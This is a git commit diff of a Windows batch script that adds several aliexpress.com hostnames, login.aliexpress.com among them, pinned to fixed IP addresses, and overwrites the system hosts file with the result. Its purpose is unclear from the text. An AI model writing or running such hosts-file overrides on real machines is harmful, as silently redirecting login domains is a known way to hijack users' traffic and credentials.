11287ad6481f19905d52f466fda042798667cac8
azertyuiopvnx <azertyuiopvnx@gmail.com>
2020-10-03 23:30:33 +0200

    Update win.bat
    Update

--- win.bat
+++ win.bat
@@ -1,4 +1,9 @@
 @echo off
 echo 184.25.158.9 login.aliexpress.com >> %temp%\hosts.txt
+echo 198.11.132.250 aliexpress.com >> %temp%\hosts.txt
+echo 23.45.96.43 a.aliexpress.com >> %temp%\hosts.txt
+echo 198.11.132.250 thirdparty.aliexpress.com >> %temp%\hosts.txt
+echo 198.11.136.101 thirdparty.aliexpress.com >> %temp%\hosts.txt
+echo 184.25.158.9 sale.aliexpress.com >> %temp%\hosts.txt
 type C:\WINDOWS\system32\drivers\etc\hosts >> %temp%\hosts.txt
 copy /Y %temp%\hosts.txt C:\WINDOWS\system32\drivers\etc\hosts
